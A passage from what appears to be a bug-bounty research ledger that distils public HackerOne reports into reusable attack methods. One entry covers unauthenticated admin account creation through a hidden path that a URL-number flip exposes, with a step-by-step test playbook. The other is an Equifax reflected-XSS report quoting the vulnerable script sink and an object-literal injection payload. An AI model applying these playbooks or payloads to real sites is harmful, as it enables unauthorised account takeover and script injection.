  6. THE RESEARCHER'S OWN NOTE, verbatim: "I CREATED 2 ACCOUNTS WHILE TESTING THIS ISSUE I HAVE PROVIED CREDS FOR THE BOTH ACCOUNT IN POC MAKE SURE TO CHECK THEM AS WELL" (the report hands over working admin credentials as PoC).
DETECTION SIGNAL: a hidden/undocumented path (found by `gobuster`/`ffuf`-style directory brute-force) serving user-management functions (add user, edit role/privilege, agency/org selector); a login prompt that appears on ONE value of a numeric path/instance segment while a sibling value renders the privileged form ungated (per-VALUE auth scoping — the gate is keyed to a path value, not to the function); a user-creation form that completes without auth and delivers credentials OUT-OF-BAND (email). TELL: "this URL asks to login, that numbered variant does not".
CHAIN: unauthenticated attacker brute-forces directories (primitive: hidden paths) -> finds the user-management directory with NO auth and flips the numeric segment 1->9 past the login prompt (primitive: per-value auth gate) -> the "Add New User" form with agency=Non-Agency provisions an ADMIN account and emails username+password to the attacker (escalation: unauthenticated admin self-provisioning) -> login with the emailed creds = full site compromise ("the entire site can be compromised", the researcher's impact line); the same surface changes privileges of existing users without authentication (escalation: vertical privilege escalation on any account). Per doctrine §8: preconditions = NONE (no authentication at any step); gain = a working admin account + arbitrary role changes. Team-rated Critical.
TRANSFERABLE TEST: (1) directory-brute-force user-management paths (`/user`, `/users`, `/admin`, `/adduser`, `/newuser`, `/manage`, `/account/create`, `/register`) and do NOT stop at a login prompt; (2) on any URL with numeric path/instance segments that "asks to login", flip each number (`1->9`, `0->1`, +/-1 on every segment) and re-request — the gate may be keyed to one value; (3) if a user/role form appears, submit it with the HIGHEST role/agency selector value and watch BOTH the response and the mailbox for provisioned credentials; (4) check whether the same surface edits existing users' roles/privileges without auth. Rule: **a login prompt on one numbered URL is not an auth check on the FUNCTION — flip the segment; and when the app's own user-management form provisions accounts with emailed credentials, an unauthenticated caller just minted an admin.**
DEDUPE/DELTA: 0 hits across all three write targets for `2354136`, `dishant`, `Non-Agency`, `1 to 9`. Related-but-distinct REVIEWED and NOT re-recorded: the batch-150 Mars #2828693 note (A ~13595: "unauthorized access to an API endpoint allows attackers to add new users and modify personal information of existing users", `visibility: no-content`, summary-only -> INVALID there because no endpoint/method was public and the class was the recorded BAC/IDOR) — this entry is admitted for the FULL reproducible method that one lacks: the per-value gate flip + form-based admin provisioning with emailed credentials + unauthenticated privilege editing. Generic "admin panel / hidden endpoints" recon (Bugbountyskills ~16082), the Jenkins internal-admin-SSO misconfig (~ledger 2506) and the unauth audit-log -> admin-panel stored XSS (~ledger 3964) are different mechanisms. New general method -> §17.479.

SOURCE: https://hackerone.com/reports/1818163  2026-11-11
ROUTE: full reporter body (1,512 B, `visibility: full`) read live this pass on the `.json` route (`curl` -> HTTP 200). Metadata: Equifax-vdp, "reflected XSS in [www.equifax.com]", weakness Cross-site Scripting (XSS) - Reflected, severity Medium 5.6 (Team: AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N), reporter `abdoubouanik`, created 2022-12-28, disclosed 2023-04-23, asset *equifax.com.
STATUS: UNVERIFIED (not reproduced — no request was sent to equifax.com this pass; every URL, payload and generated-HTML line below is quoted from the report).
CLASS: reflected XSS by EXPRESSION-VALUED PROPERTY INJECTION inside a JS OBJECT LITERAL — the search term is interpolated into a QUOTED string property of an object literal inside an inline `Analytics.trackEvent(...)` call; the payload closes the string and injects a NEW property whose value is a JS call expression (`[7].map(alert)`), keeping the object literal syntactically valid so the expression executes when the literal is evaluated (CWE-79).
CORE METHOD (the reporter's own steps, quoted):
  1. ENTRY POINT, verbatim: `https://www.equifax.com/personal/help/search?search=broook`
  2. THE SINK, verbatim generated HTML: `<script type="text/javascript"> window.onload = function(e){ Analytics.trackEvent('emptySearch',{internalSearchTerm: "broook" , numOfSearchResultsReturned: 0}); } </script>` — the `search` value lands INSIDE a double-quoted property value of an object literal in an inline script (the reporter's step 3: "`broook` word reflected in javascript code").

